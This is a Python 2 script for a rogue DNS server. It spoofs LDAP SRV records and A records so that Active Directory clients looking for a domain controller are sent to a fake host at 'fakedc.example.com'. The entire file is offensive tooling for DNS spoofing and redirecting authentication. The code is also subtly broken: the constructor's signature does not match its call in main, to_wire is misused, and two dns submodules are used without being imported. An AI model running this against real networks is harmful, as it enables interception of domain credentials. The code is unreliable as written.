
from SocketServer import UDPServer, BaseRequestHandler, ThreadingMixIn
import dns.message
import dns.rdtypes.IN
import dns.rdtypes.IN.SRV

HOSTNAME = 'fakedc.example.com.'
PORT = 53

class DNSServer(ThreadingMixIn, UDPServer):

	def __init__(self, host):
		UDPServer.__init__(self, (host,PORT), DNSHandler)

	def server_activate(self):
		print '[*] dns server: starting udp service on %s:%d' % (self.server_address[0],self.server_address[1])
		UDPServer.server_activate(self)

	def shutdown(self):
		print '[*] dns server: shutting down...'
		UDPServer.shutdown(self)

	def verify_request(self, request, client_address):
		print "[+] dns server: connection from %s:%d" % (client_address[0],client_address[1])
		return True


class DNSHandler(BaseRequestHandler):

	def handle(self):

		data = self.request[0]
		socket = self.request[1]
		server = socket.getsockname()[0]

		req = dns.message.from_wire(data)
		res = dns.message.make_response(req)

		opcode = dns.opcode.from_flags(req.flags)

		if (opcode == dns.opcode.QUERY):

			assert(len(req.question) == 1) # lame, but i've never seen more than one

			q = req.question[0]

			if (q.rdclass == dns.rdataclass.IN):

				qname = q.name.to_text()

				# point relevant SRV records to fake hostname
				if (q.rdtype == dns.rdatatype.SRV):

					##if qname.startswith('_ldap._tcp.dc.') or qname.startswith('_ldap._tcp.Default-First-Site-Name.'):
					if qname.startswith('_ldap._tcp.'):
						print '[*] dns server: SRV query for %s' % (qname)
						res.answer.append(dns.rrset.from_text(qname, 10, dns.rdataclass.IN, dns.rdatatype.SRV, '0 100 389 '+HOSTNAME))

				# spoof fake hostname in A records
				elif (q.rdtype == dns.rdatatype.A):
					if (qname == HOSTNAME):
						print '[*] dns server: A query for %s' % (HOSTNAME)
						res.answer.append(dns.rrset.from_text(qname, 10, dns.rdataclass.IN, dns.rdatatype.A, server))

		#print 'TODO: forward to DNS server'
		data = res.to_wire(res)
		socket.sendto(data, self.client_address)


if __name__ == "__main__":
	
	HOST, PORT = '0.0.0.0', 53
	server = DNSServer((HOST, PORT), DNSHandler)
	server.serve_forever()

